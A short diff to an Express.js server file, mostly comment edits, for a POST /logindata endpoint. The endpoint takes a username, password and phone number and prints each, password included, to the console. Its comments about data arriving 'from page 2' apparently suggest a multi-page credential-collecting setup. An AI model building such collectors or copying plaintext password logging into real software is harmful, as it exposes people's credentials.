@@ -1,4 +1,4 @@
-// api/server.js (Modified to include phoneNumber)
+// api/server.js (This version handles phoneNumber and is correct for single-page too)
 const express = require('express');
 const cors = require('cors');
 
@@ -9,10 +9,10 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 app.post('/logindata', (req, res) => {
-    const { username, password, phoneNumber } = req.body; // Destructure all three
+    const { username, password, phoneNumber } = req.body;
     const timestamp = new Date().toISOString();
 
-    if (!username || !password) { // Username and password are still considered essential for this endpoint
+    if (!username || !password) { // Username and password are still considered essential
         return res.status(400).json({ message: 'Username and password are required.' });
     }
 
@@ -24,7 +24,7 @@ app.post('/logindata', (req, res) => {
     if (phoneNumber) {
         console.log("Phone Number:", phoneNumber);
     } else {
-        console.log("Phone Number: Not provided on this submission"); // Should be provided from page 2
+        console.log("Phone Number: Not provided"); 
     }
     console.log("------------------------------");
 
